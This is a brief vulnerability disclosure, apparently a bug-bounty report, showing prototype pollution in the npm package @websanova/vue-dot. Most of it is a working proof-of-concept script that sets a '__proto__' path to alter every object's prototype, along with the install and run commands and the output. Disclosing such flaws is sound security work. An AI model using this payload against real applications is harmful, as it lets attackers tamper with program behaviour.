# Description

Prototype Pollution in @websanova/vue-dot

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var dot = require('@websanova/vue-dot');
var obj = {}
console.log("Before : " + {}.polluted);
dot.set("__proto__.polluted","Yes! Its Polluted",obj);
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i @websanova/vue-dot # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
